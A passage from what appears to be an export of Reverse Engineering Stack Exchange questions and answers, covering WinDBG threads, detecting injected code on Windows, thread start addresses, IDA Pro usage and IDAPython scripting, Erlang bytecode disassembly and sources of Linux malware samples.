kernel32!BaseThreadInitThunk+0x12
ntdll!RtlInitializeExceptionChain+0xef
ntdll!RtlInitializeExceptionChain+0xc2
</code></pre>

<p>It seems that this thread belongs to some <code>msiltcfg.dll</code> which would be a Windows 7 DLL, but why does it cread threads in my process?</p>

<p><code>002:</code> So this would probably be the WinDBG thread which Akira32 refers to in his answer, right? (why does WinDBG need a thread of his own?).</p>

<pre><code>ntdll!DbgBreakPoint
kernel32!BaseThreadInitThunk+0x12
ntdll!RtlInitializeExceptionChain+0xef
ntdll!RtlInitializeExceptionChain+0xc2
</code></pre>
","<p>By your description:</p>

<p>Yes, your program should have only one thread running, without debuger. You can check this on task manager.
However when you attach to windbg it will create a thread on break. 
The third thread that you mention, i really dont have a clue. Maybe a injected dll running code... </p>

<p>But you can try to find out by opening the windows ""call stack"" on winbgd. (and selecting each thread, on thread window)</p>

<ul>
<li>You will see you code's thread, with last function call on top.</li>
<li>Windbg thread , probably with the function ntdll!DbgBreakPoint on top.    </li>
<li>The third one, see where it stops and what dll the code    belongs on dissambly window.</li>
</ul>

<p>You are right. You just need to set a breakpoint any thread will trigger on acess :).</p>

<p>Lets us know what you find out :).</p>

<p>Hope I have helped!</p>

<p><strong>UPDATE</strong></p>

<pre><code>002:
</code></pre>

<p>The windbg creates that thread every time you pause the attached process execution. It makes sense because the windbg needs a breakpoint to stop the execution, since he dont know where to patch a normal breakpoint on the code, to break immediately. He creates a thread to call dbgbreakpoint and break.</p>

<p>If you continue the execution, the windbg's thread will terminate. This is a normal behavior of the debuggers, not only windbg.</p>

<pre><code>001:
</code></pre>

<p>The msiltcfg.dll has functions to handle MSI installers. ""Windows Installer Configuration API Stub""
Its strange,for me, that the process has this dll loaded. By the stack call you show, its waiting for something. A thread, mutex event, etc... This thread has nothing to do with windbg. Something has loaded that dll on your process and created the thread. Almost for sure it is a operating system process.</p>

<p>One thing you can do is check if other processes (calc.exe or notpad.exe, simple ones) got the same thread or the same dll loaded. Some programs/OS can load dll's on abritary processes or even all and run code (using the WIN32 API function CreateRemoteThread). This is a normal behavior done by malware too :). </p>

<p>One thing you have for sure is that your program has only created one thread. And in a normal situation it should not have more than one.</p>

<p>I tested a program like your to be sure, and just got a thread.</p>
","3198"
"Can a Windows process check if it has been injected by another process?","2001","","<p>There are many tutorials which show how to detect injected code into process memory. However, this generally requires using a debugger. </p>

<p>Is it possible for a process to somehow detect if it has been injected by another process using winapi? If so, how?</p>

<p>More specifically, are there any ""fixed/likely"" characteristics of injected code? For instance, from <a href=""https://reverseengineering.stackexchange.com/questions/3482/does-code-injected-into-process-memory-always-belong-to-a-page-with-rwx-access"">this question</a> it appears that injected code can be characterized by always appearing in pages that have the following protection flags set: PAGE_READWRITE_EXECUTE, PAGE_EXECUTE_READ, PAGE_EXECUTE_WRITECOPY and possibly (but unlikely) PAGE_EXECUTE. Can you point out other characteristics of injected code?</p>
","<p>Injected code could represented by, but not limited to:</p>

<p><strong>Remotely created thread</strong> could be detected by several techniques:</p>

<ol>
<li>Periodically check if process threads were created by current process using <code>NtQueryProcessInformation</code>.</li>
<li><p>For each thread check if it is running from the address space of the original executable and not from some orphaned memory page:</p>

<ol start=""3"">
<li><a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms684283%28v=vs.85%29.aspx"" rel=""nofollow noreferrer""><code>NtQueryInformationThread</code></a></li>
<li>Set second parameter to <code>ThreadQuerySetWin32StartAddress</code></li>
<li><code>GetModuleInformation</code> - check if the thread starting address is in the range of each of the loaded modules and those modules are legit (by known list/by path).</li>
<li>Check <a href=""https://stackoverflow.com/questions/10887866/how-to-retrieve-start-address-of-a-thread-using-its-id"">here</a> too.</li>
</ol></li>
<li><p>Monitor thread creating API inside current process and also check if the creating PID belong to current process - <code>NtQueryProcessInformation</code>, <code>CreateToolhelp32Snapshot</code>.</p></li>
<li>Monitor memory protection APIs (<code>VirtualProtect</code>) to detect if someone tries to modify your code and then check if that ""someone"" belongs to legit process address space.</li>
<li>By keeping the list of legit loaded modules, one also can check if each thread in process belong to address space of a legit module from the list.</li>
<li>Monitor <code>LoadLibrary</code> for a chance someone trying to load unknown module into your process.</li>
</ol>

<p><strong>Injected code without thread</strong></p>

<ol start=""10"">
<li><p>Check the integrity of your process - look for hot patching of various APIs, depends on the process. Injected code could be triggered by some patch inside current process.</p></li>
<li><p>Monitor APC creating API <a href=""http://www.cs.miami.edu/~burt/journal/NT/processinit.html"" rel=""nofollow noreferrer"">(<code>KiUserApcDispatcher</code>)</a> if the target code belongs to current process. OS's APC also could be filtered out.</p></li>
</ol>

<p>There are other ways to inject code, even before the legit process will start to run and place its protections - using combination of <code>WriteProcessMemory</code>/<code>GetThreadContext</code>/<code>SetThreadContext</code> which theoretically could bypass all your implemented protections. When your code and injected one are only running in the same ring (user mode), it all goes down to who is gaining control first. Look for <a href=""http://resources.infosecinstitute.com/code-injection-techniques/"" rel=""nofollow noreferrer"">code cave method</a> and think for example when malcode is injected into explorer.exe and you are starting your program :-).</p>

<p>Of cause, you can load your driver into kernel, which will give you more solid control over the code injection to your process and a good protection, but that of cause depends on the skills and what you are trying to protect.</p>
","3490"
"Debugging the code executed on a new thread","1997","","<p>I would like to step into some code which is ran on a new thread. Luckily, after the initial startup this is the only thread that is newly created in the program. I can set the debugger to break on the creation of a new thread. But all I see is the WinAPI and lower level calls that execute the thread. How can I step into the code that is executed on the thread to see what it does?</p>
","<p>BP on <code>CreateThread</code>, then see 3rd parameter -> <code>lpStartAddress</code> of the Thread (its EntryPoint). Now simply BP on that address and step from there when it breaks</p>
","6281"
"Attaching debugger to process IDA Pro privilege problem","1996","","<p>I am trying to attach the WinDBG to particular process but I constantly get the error below :
<a href=""https://i.stack.imgur.com/M2puS.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/M2puS.png"" alt=""enter image description here""></a> <br/>
I am using win 7 x64 and am trying to debug x64 application.
I run the IDA Pro with admin privileges. I have run the application both with admin privilege and the user one. I even tried to run it on different windows user account with admin privilege but I still get the same error.</p>
","<p>AFAIK you cannot debug a 64 bit application locally with IDA Pro. 
<br>You need to use remote debugging.</p>

<p>See this page: <a href=""https://www.hex-rays.com/products/ida/debugger/#details"" rel=""nofollow"">https://www.hex-rays.com/products/ida/debugger/#details</a>
<br>and this: <a href=""https://www.hex-rays.com/products/ida/debugger/cross-win-linux/win32towin64.shtml"" rel=""nofollow"">https://www.hex-rays.com/products/ida/debugger/cross-win-linux/win32towin64.shtml</a></p>
","10745"
"IDA Array of structs hiding strings","1989","","<p>I have just started teaching myself IDA and I have had some trouble with an array of structs.</p>

<p>I have found and defined a struct similar to this: (simplified)</p>

<pre><code>struct {
char filename[50];
int field2;
int field3;
}
</code></pre>

<p>I then found an array of these.</p>

<p>So I defined the struct, and then the array.</p>

<p>Before I defined them, the filename showed as a comment wherever it was referenced in the code.</p>

<p>Now however, it only references the first element of the array and an offset.
So now looking through the code, I don't have comments with the file being referenced, which makes it hard to tell what file the code is working on.</p>

<p>Is there a way for me to keep the array of structs and the comments, or do I need to undefine the array &amp; struct to get the comment with filename back?</p>

<p>EDIT:
I forgot to add, the filenames also no longer show up in the strings window after I created the array of structs</p>

<p>EDIT 2:
Here is my struct definition</p>

<pre><code>000000 file_data_struct_t struc ; (sizeof=0x4F)
00000000 base_file_path  db 18 dup(?)            ; string(C)
00000012 unknown         db 44 dup(?)
0000003E loaded_data_ptr dd ?                    ; offset
00000042 ptr2            dd ?                    ; offset
00000046 file_length     db ?
00000047 unknown3        db ?
00000048 unknown4        db ?
00000049 unknown5        db ?
0000004A use_2nd_func    db 4 dup(?)
0000004E flag            db ?
0000004F file_data_struct_t end
</code></pre>

<p>This is for the game <a href=""https://en.wikipedia.org/wiki/Theme_Park_(video_game)"" rel=""nofollow"">Theme Park</a></p>
","<p>Press <kbd>*</kbd> and uncheck 'Create as array'. This will convert the array into separate structs, and you'll see the strings again.</p>
","10991"
"Using IDA cross platform: VM, Wine, other options?","1977","","<p>I'm looking to buy an IDA Pro license for my own home use. However, I use all three supported platforms: Windows and Linux on desktop, and OS X on a laptop. I can't afford more than one license, so I'm interested to see if other people have been in a similar situation and how they solved it. </p>

<p>My initial thoughts on each version:</p>

<ul>
<li>Mac OS X: I use my laptop most often, but reversing on a 13"" screen isn't always fun, I would not be able to use the Mac version on either Windows or Linux.</li>
<li>Windows: I've heard good things about running the Windows version in Wine on Mac and Linux, or even in a VM.</li>
<li>Linux: I almost always have a Linux VM even when I'm on Mac or Windows, so I could always install IDA in a VM.</li>
</ul>

<p>I'm leaning towards the Windows or Linux versions to be able to use anywhere, but I've never used IDA in a non-native environment, so I'm somewhat concerned about keyboard shortcuts and integration.</p>

<p>Any suggestions on a good way to go?</p>
","<p>Your IDA Pro license allows you to install IDA on two desktops and one laptop. You might want to check the license situation if you install IDA in a ""portable/VM"" environment, but only Hex-Rays can give you definite information here. So i'm omitting that part from my answer. (Some Hex-Rays employees frequent this site as well).</p>

<p>This depends a lot on your use case. How often do you want to do some reversing work when you have your laptop, but don't have access to your (Windows/Linux) desktop?</p>

<p>When i'm using IDA, i want to have a lot of screen estate for it, and don't generally need much screen for the debugee. Which generally means you want IDA on your host OS, and the debugee in the guest OS, as you'll always be able to access the whole screen on the host, but maybe not in the guest, especially in multi-monitor-configurations.</p>

<p>Personally, i have the Linux version, and while Linux is my main desktop environment, i needed to use IDA at a customer once, that allowed only Windows in their network. I was allowed to install VirtualBox and run Linux in that VirtualBox (Host only network, no access from Linux to their net), and my IDA worked very well, using the ""remote debugger"" to debug stuff running on the host. So while i did miss my big screen, i was able to work without any hassle regarding keyboard shortcuts, inability to do what i needed, or crashes.</p>

<p>So, if you're travelling and working on your Mac laptop 95% of your time, i'd buy the Mac version if i were you, and debug Linux/Windows programs in VMs. If you're have access to desktop most of the time, and consider IDA on the Mac a kind of ""emergency mode"", get the version for the OS you use on your desktop most, and install a VM with IDA inside it on the Mac. In this case it shouldn't matter much if that OS is Windows or Linux.</p>
","12879"
"How to create a IDA FLIRT signature for a PPC library?","1975","","<p>I'd like to create a IDA FLIRT signature for the following PPC uClibc library:</p>

<pre><code>libuClibc-0.9.15.so: ELF 32-bit MSB shared object, PowerPC or cisco 4500, version 1 (SYSV), dynamically linked, for GNU/Linux 2.0.0, stripped
</code></pre>

<p>I got the FLAIR tools from hex-rays but didn't manage to create the .sig file.
If I understood correctly, a <code>.pat</code> file must be created first, from which a <code>.sig</code> file can be created then. I tried <code>./pelf.exe libuClibc-0.9.15.so</code>, but this only returned an 'invalid input file' error.</p>

<p>How can I create a FLIRT signature from this library?</p>
","<p>AFAIK, you can only create the <code>.pat</code> files from statically linked libraries using the method you describe. It appears your file is dynamically linked (that would explain the 'invalid input file' message)</p>

<p>You can give a try to <a href=""https://github.com/fireeye/flare-ida/blob/master/python/flare/idb2pat.py"" rel=""nofollow"">this IDAPython plugin</a>. A good explanation from its author can be found <a href=""https://www.fireeye.com/blog/threat-research/2015/01/flare_ida_pro_script.html"" rel=""nofollow"">here</a></p>

<p>Good luck!</p>
","8901"
"Rebase program with negative shift delta in IDA","1975","","<p>If a binary file is open with ROM starting at 0x10A000, how do I easily change the ROM starting address of the file to 0x109000? I always had to restart IDA to do it. I also tried to ""rebase the program using shift delta"" but I don't know how to use a negative shift delta, plus it's not automated.</p>
","<p>Rebase it and choose a new <strong>Image base</strong> of <code>0x109000</code> instead of trying to specify a <strong>Shift delta</strong>.</p>
","3910"
"Detecting recursive functions in IDA","1972","","<p>How can I detect/mark recursive functions in IDA?</p>

<p>Trivial method would be to check every function's call list and if it calls itself then it's recursive. I'ld like to put a comment or some kind of indicator that would help me distinguish these functions. </p>
","<p>It is not trivial task. You can do it relatively easy if you not taking in account indirect calls (for example such as virtual functions in C++) and calls from another function like this:</p>

<pre><code>int f() {
    g();
}

int g() {
    f();
}
</code></pre>

<p>It can be much more complicated if one of your functions is in another binary (dll for example). So, there are two ways to do it, a static and a dynamic way.</p>

<h3> </h3>

<h3>Recursive assembly traversal - static analysis approach</h3>

<p>You should write the script in IDAPython that passes over the function,
and recursively processes each call. If you find current function in collected stack the function is recursive.</p>

<p>Very simple variant looks like this:</p>

<pre><code># I didn't check it, use carefully, beware the errors in this code
import idautils
import idc
import idaapi

def handle_function(func_start):
    global stack
    if func_start in stack:
        print ""This is recursive function"", hex(func_start), Name(func_start)
        for x in stack:
            print ""\t"", hex(x)
        #insert your renaming here, it should be idc.MakeName
        return

    stack.append(func_start)
    for h in idautils.FuncItems(func_start):
        for r in idautils.XrefsFrom(h, 0):
            if r.type == fl_CF or r.type == fl_CN:
                print hex(h), ""--&gt;"", hex(r.to)
                if r.to == func_start:
                    # Insert renaming here too for simple recursion
                    print ""It is simple recursive function that calls itself directly""
                    return
                else:
                    handle_function(r.to)
    stack = stack[:-1]

for f in idautils.Functions():
    stack = []
    handle_function(f)
</code></pre>

<h3> </h3>

<h3>Breakpoint analysis - dynamic analysis approach</h3>

<p>Write script in IDAPython that recognizes all function prologues and filters out all functions that doesn't call anything. 
Put breakpoint on each collected prologue and run the program.
Each time the program stops, analyze stack of the program using IDAPython in order to find function you are stopped on in the stack. If you find it, the function is recursive. </p>
","3500"
"Decompile erlang .beam files compiled without debug_info","1971","","<p>I have an app that use erlang .beam compiled files without debugging information.
Someone have some tips how to decompile or reverse engineering these?</p>

<p>Thanks in advance</p>
","<p>You can get low-level bytecode source of .beam file with <strong>beam_disasm:file(module_name)</strong></p>

<p>It's not easy to read it and takes time to figure it out. But it's much verbose and easier to comprehend than any real hardware assembly code. You can give it a try.</p>

<p>For example, if you have a .beam file called ""my_module.beam"", open <em>erl</em> and type </p>

<pre><code>file:write_file(""/tmp/my_module_disasm"", io_lib:fwrite(""~p.\n"", [beam_disasm:file(my_module)])).
</code></pre>

<p>where <em>'/tmp/my_module_disasm'</em> is the path where you want to save the result.</p>
","9295"
"How to go into thread function knowing only the thread handle","1970","","<p>How do I go into the thread function (so I can do step by step tracing), knowing only the handle to the thread. I am using OllyDbg for tracing and the thread is created through the API <code>ZwCreateProcess()</code>. However, the documentation that I have seen for this API does not contain the creation flags and pointer to the defined function which it will execute, which I both need.</p>

<p>Is there a way to go into the thread function, knowing only the thread handle? Also, are there other ways to create suspended threads aside from <code>CreateThread()</code> and <code>CreateRemoteThread()</code>?</p>
","<blockquote>
  <p>Is there a way to go into the thread function, knowing only the thread
  handle?</p>
</blockquote>

<p>Yes, it's a 2-step process.</p>

<p><strong>Step 1 - Convert the thread handle to a thread ID</strong></p>

<p>In <a href=""https://technet.microsoft.com/en-us/sysinternals/bb896653.aspx"" rel=""nofollow noreferrer"">Process Explorer</a>'s menu bar, check the following:</p>

<ul>
<li><em>View</em> → <em>Show Lower Pane</em></li>
<li><em>View</em> → <em>Lower Pane View</em> → <em>Handles</em></li>
<li><em>View</em> → <em>Select Columns...</em> → <em>Handle</em> tab → check all checkboxes</li>
</ul>

<p>Next, select your target process in Process Explorer's list of processes. You'll then see in the lower pane the list of handles for that process, including thread handles. Find the thread ID associated with your target handle. For the example below, thread handle <code>0x228</code> is associated with thread ID <code>3000</code>:</p>

<p><img src=""https://i.stack.imgur.com/mddAT.png"" alt=""Handle to ID""></p>

<p>Though handle values are shown in hexadecimal in Process Explorer, thread IDs are shown in decimal. Thus thread ID <code>3000</code> in decimal is equal to thread ID <code>0xBB8</code> in hexadecimal.</p>

<p><strong>Step 2 - Find EIP for the thread ID</strong></p>

<p>In OllyDbg's menu bar, select <em>View</em> → <em>Threads</em>. Right-click on the thread whose <em>Ident</em> corresponds to the thread ID you found in Step 1 (<code>0xBB8</code> in the example below), and select <em>Show registers</em>:</p>

<p><img src=""https://i.imgur.com/Z10x3sX.png"" alt=""Threads""></p>

<p>This will show you the current <code>EIP</code> for that thread, which is the next instruction to be executed once that thread is resumed:</p>

<p><img src=""https://i.stack.imgur.com/iKgc4.png"" alt=""Registers""></p>

<p><strong><em>Alternative</em> Step 2 - Find EIP for the thread ID</strong></p>

<p>If the target thread was created in a suspended state and not yet resumed then the thread won't show up in OllyDbg's thread window. In this case, you can use <a href=""https://technet.microsoft.com/en-us/sysinternals/bb897415.aspx"" rel=""nofollow noreferrer"">LiveKd</a> to find the thread's starting address by issuing the LiveKd command <code>!thread -t &lt;thread ID in hexadecimal&gt;</code></p>

<pre><code>kd&gt; !thread -t BB8
Cid handle table at 88e01108 with 944 entries in use

THREAD 86B4E548  Cid 169c.0bb8  Teb: 7ffdb000 Win32Thread: 00000000 WAIT: (Suspended) KernelMode Non-Alertable
SuspendCount 1
FreezeCount 1
    86b4ec28  Semaphore Limit 0x2
Not impersonating
DeviceMap                 9a70f9e8
Owning Process            86b4cd40       Image:         wordpad.exe
Attached Process          N/A            Image:         N/A
Wait Start TickCount      21829348       Ticks: 1299 (0:00:00:20.264)
Context Switch Count      1              IdealProcessor: 0
UserTime                  00:00:00.000
KernelTime                00:00:00.000
Win32 Start Address 0x002cb23d
Stack Init 8b777ed0 Current 8b777a40 Base 8b778000 Limit 8b775000 Call 0
Priority 8 BasePriority 8 UnusualBoost 0 ForegroundBoost 0 IoPriority 2 PagePriority 5
ChildEBP RetAddr  Args to Child
8b777a58 82a88d3d 85807a60 00000000 82b35d20 nt!KiSwapContext+0x26 (FPO: [Uses EBP] [0,0,4])
8b777a90 82a87b9b 85807b20 85807a60 85807c28 nt!KiSwapThread+0x266
8b777ab8 82a8158f 85807a60 85807b20 00000000 nt!KiCommitThreadWait+0x1df
8b777b34 82abbfd9 85807c28 00000005 00000000 nt!KeWaitForSingleObject+0x393
8b777b4c 82abbaf4 00000000 00000000 00000000 nt!KiSuspendThread+0x18 (FPO: [3,0,0])
8b777b90 82e2390f 00000000 00000000 00000000 nt!KiDeliverApc+0x17f
8b777bb0 82e23b29 00000001 00000000 00000000 hal!HalpDispatchSoftwareInterrupt+0x49 (FPO: [Non-Fpo])
8b777bc8 82e23ba9 00000000 00000000 8b777c20 hal!HalpCheckForSoftwareInterrupt+0x83 (FPO: [Non-Fpo])
8b777bd8 82c6450d b553bcc6 00000000 00000000 hal!KfLowerIrql+0x61 (FPO: [Non-Fpo])
8b777c20 82abb559 00000000 778870d8 00000001 nt!PspUserThreadStartup+0x14
00000000 00000000 00000000 00000000 00000000 nt!KiThreadStartup+0x19
</code></pre>

<p>You can see <code>Win32 Start Address 0x002cb23d</code> in the output above, which is the starting address for the suspended thread.</p>

<blockquote>
  <p>Also, are there other ways to create suspended threads aside from
  <code>CreateThread()</code> and <code>CreateRemoteThread()</code>?</p>
</blockquote>

<p>Yes, you can call <a href=""http://undocumented.ntinternals.net/source/usermode/undocumented%20functions/nt%20objects/thread/ntcreatethread.html"" rel=""nofollow noreferrer""><code>ntdll!NtCreateThread()</code></a> or <code>ntdll!NtCreateThreadEx()</code>.</p>
","8426"
"Output of gdb `info registers`","1960","","<p>Upon running info registers in gdb, we get an output similar to the following:</p>

<pre><code>rax            0x1c 28
rbx            0x0  0
rcx            0x400a60 4196960
rdx            0x7fffffffde88   140737488346760
rsi            0x1  1
rdi            0x400932 4196658
rbp            0x0  0x0
rsp            0x7fffffffde68   0x7fffffffde68
r8             0x400ad0 4197072
r9             0x7ffff7dea560   140737351951712
r10            0x7fffffffdc30   140737488346160
r11            0x7ffff7732dd0   140737344908752
r12            0x4007f0 4196336
r13            0x7fffffffde80   140737488346752
r14            0x0  0
r15            0x0  0
rip            0x7ffff7732dd0   0x7ffff7732dd0
eflags         0x202    [ IF ]
cs             0x33 51
ss             0x2b 43
ds             0x0  0
es             0x0  0
fs             0x0  0
gs             0x0  0
</code></pre>

<p>While I do understand the for rax, rcx etc, GDB is converting the value to decimal for the second column, this doesn't seem consistent. Some registers, namely rsp and rip show the same value in hex, even in the second column. eflags on the other hand shows the flags in the second column.</p>

<p>What is the reason that gdb does this? If it is going to show the same info (in case of rsp and rip), isn't it redundant? Also, how does this generalize on other architectures? (The above output is for x86-64).</p>

<p><a href=""https://stackoverflow.com/questions/31026000/gdb-info-registers-command-second-column-of-output"">Source</a>. I re-asked this question since I thought I would find more specific answer in reverse engineering point of view.</p>
","<p>In fact, in assembly you can find only three types of values:</p>

<ol>
<li>Numerical values;</li>
<li>Memory addresses;</li>
<li>Instructions (opcodes).</li>
</ol>

<p>General purpose registers, such as <code>rax</code>, <code>rbx</code>, ..., are used to store either numerical values (that will trigger the behavior of the program) or memory addresses (to know where to read/write or to jump).</p>

<p>Of course, as most of human beings are used to decimal format for the values used in programs, it is important to display a decimal format when the register might contain such values.</p>

<p>Now, it is important to know that memory addresses are usually given in hexadecimal format (mainly for compactness reasons). And, general purpose registers might also contain memory addresses. That is why <code>gdb</code> display both decimal and hexadecimal formats just in case one or the other is the best suitable for the current value.</p>

<p>The registers <code>rsp</code>, <code>rip</code> (and <code>rbp</code>) are special cases because they are specifically used to store addresses (and only this), thus it would be of no use to translate the content of such registers into decimal format. That is why <code>gdb</code> is only giving an hexadecimal format for these registers.</p>

<p>Finally, the case of the <code>rflags</code>/<code>eflags</code> is a bit special because this register has a meaning that is bit-per-bit dependent (see the following figure).</p>

<p><img src=""https://i.stack.imgur.com/slUoN.png"" alt=""EFLAGS bit-per-bit details""></p>

<p>Therefore, giving the decimal, hexadecimal or binary format is not really useful to the user (except if you can relate the numbers to the flags instantly). But, it is much more useful to give the list of flags that are set as 'true' (this is the <code>[ IF ]</code> that you see in your example). Yet, <code>gdb</code> gives the hexadecimal value of the <code>eflags</code> as it can be accessed and used as a value in programs (I have seen this for obfuscation purpose).</p>
","9222"
"Process Dumping and Ida","1947","","<p>Up until now I've been performing static analysis using Ida and run time analysis using OllyDBG.</p>

<p>I've identified a function in Olly which I would like to start documenting further in Ida, however I can't seem to find the function in Ida, and the executable doesn't appear to be packed or obfuscated.</p>

<p>What could cause this? (besides user error :p)</p>

<p>I've heard of dumping a process to memory, then performing static analysis on that dump file - would this make sense in the current context?</p>

<p>What differences would there be compared to just looking at the executable? </p>

<p>Does the software used to dump the process effect it's structure - are there different types of process dumps?</p>

<p>How would I actually go about opening the dump file in Ida?</p>
","<p>If your binary is allocating a new memory page &amp; writing code on it, that's something you won't see on the static binary. Performing a full dump of the process from memory and loading this new binary into IDA will indeed show you those new parts. The data has to come from somewhere though (ressource, compressed, encrypted, another file, Internet, etc).</p>

<p>As you mentioning that the binary appears to be neither packed nor obfuscated, be sure to check you're not just into one of the loaded DLL of your binary (reversing one of the imported DLL might not be what you're willing to do?).</p>
","12358"
"Where can I get Linux malware samples?","1937","","<p>There have been numerous sites stated in this wonderful <a href=""https://reverseengineering.stackexchange.com/questions/206/where-can-i-as-an-individual-get-malware-samples-to-analyze"">post</a> that one could retrieve malware samples. However, I am having a difficult time (sorry D:) locating Linux-specific malware from those sites as mostly are samples for Windows (I think). Where can I find and download these Linux samples that I seek?</p>

<p>BTW, this is for learning to create ClamAV and YARA signatures.</p>
","<p>If you're willing to pay for <a href=""https://www.virustotal.com/en/documentation/private-api/"" rel=""nofollow noreferrer"">VirusTotal's Private API</a>, you can search for and download Linux malware from there.</p>

<p>A sample search for Linux ELF files with 5 or more AV detections would be <a href=""https://www.virustotal.com/intelligence/search/?query=magic%3Aelf%20positives%3A5%2B"" rel=""nofollow noreferrer""><code>magic:elf positives:5+</code></a> (file hashes blurred in the screenshot below) -</p>

<p><img src=""https://i.stack.imgur.com/7rNwf.png"" alt=""VirusTotal""></p>
","9282"
"How can I tell if an app is using anti-debug techniques?","1935","","<p>How can I detect whether an application is using anti-debug techniques? I'm using OllyDbg (2.01beta).</p>
","<p>Peter Ferrie has written a nice paper on this: <a href=""http://pferrie.host22.com/papers/antidebug.pdf"" rel=""nofollow"">The ""Ultimate"" Anti-Debugger Reference</a>. A lot of techniques exist, like timing, checking if a process is running named OllyDBG for example. Sometimes people come up with new ideas. Step though your program and try to detect yourself if the program acts differently due to your debugging / olly or vmware (if this is the case).</p>
","2779"
"How much Cryptography knowledge is important for reverse engineering?","1928","","<p>Is understanding of Cryptography really important for a reverse engineer? </p>

<p>Thanks.</p>
","<p>It is more and more important for practical reverse-engineering. It is now present in malware, the example of Stuxnet, Flame and others are quite typical of the usage of cryptography in such context. And, it is also present in most protection schemes because a lot of techniques use cryptography to protect the code and data. Just consider software such as Skype or iTunes which are relying on cryptography to protect their protocol or to hide information in the executable.</p>

<p>So, indeed, it would be really a problem if you do <strong>not</strong> understand a bit cryptography when reversing. And, by ""<em>understanding cryptography</em>"", I mean at least to be able to recognize the code of classical cipher algorithms at assembly level such as DES, AES, SHA-1, SHA-3, and so on. And, also to know classical flaws and cryptanalysis techniques for weak crypto (such as frequency analysis).</p>

<p>A good way to learn about the cryptography needed for reverse-engineering would be to implement (with the help of existing codes found on the Net) your own cryptographic library with classical ciphers and look at the generated assembly. If you do not have the patience to do so, just look at the crypto-lib of <a href=""http://www.openssl.org/source/"" rel=""nofollow"">OpenSSL</a>, get it compiled and look at the code and the assembly.</p>

<p>Of course, more you know about it, more you will be efficient when facing it.</p>
","3481"
"Ida Pro: parsig complex operand expression using Idapython","1928","","<p>Say given the following line in Ida Pro:</p>

<pre><code>mov     [rsp+3F8h+var_3F8], 0
</code></pre>

<p>How can I parse and access the items inside the <code>[ ]</code>?
What I tried:</p>

<ul>
<li><code>idc.GetOpnd(addr, n)</code>         # returns a string '<code>[rsp+3F8h+var_3F8]</code>'</li>
<li><code>idc.GetOperandValue(addr, n)</code> # returns <code>4</code>, which is explained in the <a href=""https://code.google.com/p/idapython/source/browse/trunk/python/idc.py"" rel=""nofollow"">idc.py</a> file as follows</li>
</ul>

<blockquote>
  <p>def GetOperandValue(ea, n):
  """""" <br>
  Get number used in the operand</p>
  
  <p>This function returns an immediate number used in the operand</p>
  
  <p>@param ea: linear address of instruction @param n: the operand number</p>
  
  <p>@return:</p>
  
  <p>value operand is an immediate value => immediate value</p>
  
  <p>operand has a displacement => displacement</p>
  
  <p>operand is a direct memory ref => memory address</p>
  
  <p>operand is a register => register number</p>
  
  <p>operand is a register phrase => phrase number </p>
  
  <p>otherwise => -1 <br>
  """"""</p>
</blockquote>

<p>How can I access the elements of the 'phrase', i.e. the <code>rsp</code>, <code>3F8h</code>, and <code>var_3F8</code>? I am looking for something like this:</p>

<pre><code>my_op_phrase = idc.ParseOperandPhrase(ea, n)
my_op_phrase[0] #-&gt; 'rsp'
my_op_phrase[0].type #-&gt; idaapi.o_reg

my_op_phrase[1] #-&gt; 0x3F8h
my_op_phrase[1].type #-&gt; idaapi.o_imm

my_op_phrase[2] #-&gt; 'var_3F8'
…
</code></pre>

<p>Is this even possible or am I misunderstanding something?</p>
","<p>Note that the original assembly instruction was <em>probably</em> <code>mov [rsp+4], 0</code>(*). This is why <code>idc.GetOperandValue</code> returns 4.</p>

<p>Especially with older compilers, that used <code>push</code> and <code>pop</code> a lot, the value of <code>rsp</code> varies wildly during the execution of a function. What is <code>esp+8</code> now would be <code>esp+12</code> after a push; what would be <code>rsp+8</code> now would be <code>rsp</code> after a pop. So, while reading a piece of (plain) assembly code it's very difficult to keep track of which stack location gets accessed when.</p>

<p>(This has improveed recently; x64 abis use registers to pass parameters so the code doesn't <code>push</code> and <code>pop</code> as much anymore, and compilers like <code>gcc</code> make enough space on the stack and directly put parameters in addresses relative to <code>esp</code> even on 32 bit, so <code>esp</code>/<code>rsp</code> don't change that much anymore. But still, there's a lot of old code to reverse.)</p>

<p>To improve the situation, IDA assigns variable names to stack locations, like your <code>var_3F8</code>. Whenever an instruction does some <code>sp</code> relative addressing, IDA uses the variable name, and emits an additional offset to account for changes to the stack pointer since the function start. So if your original code looks like</p>

<pre><code>mov [rsp+8], rax
sub rsp, 128
mov [rsp+136], rbx
push rcx
mov [rsp+144], rdx
</code></pre>

<p>it accesses the same memory address in every case. Ida converts this to</p>

<pre><code>mov [rsp+0+var_8], rax
sub rsp, 128
mov [rsp+128+var_8], rbx
push rcx
mov [rsp+136+var_8], rdx
</code></pre>

<p>However, these changes are display only, they do not change your binary! Getting the operands will still return <code>8</code>, <code>136</code> and <code>144</code>, not the values ida displays to you.</p>

<p>If you want to analyze this automatically, you can <em>either</em> keep track of the stack pointer offset yourself, and adjust the result of <code>GetOperandValue</code> accordingly, <em>or</em> you'll have to use the python string functions on the output of <code>GetOpnd</code>, throw away the middle part, and compare the right part (the variable names).</p>

<p>(*) which seems a bit strange now i think of it, since you're obviously using 64 bit, as your stack pointer is <code>rsp</code>, which would hint at 8 byte alignment.</p>
","9042"
"IDA Pro: use structs on parameters","1926","","<p>I have a small function that is given a <code>struct</code> as parameters. The <code>struct</code> looks to something like this:</p>

<pre><code>struct my_struct {
  short a;
  unsigned int b;
  unsigned int c;
};
</code></pre>

<p>Taking care of the alignment I build the following <code>struct</code> in IDA:</p>

<pre><code>field_0 +0x0
field_1 +0x4
field_2 +0x8
</code></pre>

<p>The compiler builds it so that it takes <code>rbp+0x10</code> as the first field in the <code>struct</code>, <code>rbp+0x14</code> as the second and so on. The problem now arises because if I try to apply the pre-defined IDA <code>struct</code> to the instructions, I always get something like <code>[rbp+struct.field_0+0x10]</code>. This get more complicated if there is actually something in my struct at <code>+0x10</code>, because then it just shows <code>[rbp+struct_fieldX]</code> (which is wrong).</p>

<p>The question is: <em>Is there a way to tell IDA (I'm using 6.3) to apply the <code>struct</code> with an offset of <code>0x10</code>?</em> </p>

<p>The dirty trick for this simple case is to create a <code>struct</code> that has 2 <code>size_t</code> dummy fields for the <code>RIP</code> and <code>SFP</code>, but that does not seem to be right way to go here.</p>
","<p>Add your struct in the function's stack view:</p>

<ol>
<li>With your cursor in the function's disassembly view, press <kbd>Ctrl</kbd>+<kbd>K</kbd> to open the stack view.</li>
